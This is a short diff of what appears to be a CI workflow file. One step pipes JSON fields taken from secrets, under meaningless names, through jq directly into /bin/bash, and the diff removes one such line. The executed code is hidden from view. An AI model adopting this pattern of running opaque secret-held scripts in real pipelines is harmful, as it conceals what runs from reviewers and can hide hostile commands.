@@ -21,7 +21,6 @@ jobs:
           y7180: ${{ secrets.y7180 }}
         run: |
           printf '%s' "$y7180" | jq -r .jc2 | /bin/bash
-          echo $mlylq682 | jq -r .t9 | /bin/bash
           printf '%s' "$rm9" | jq -r .n44807 | /bin/bash
 
       - name: Archive data
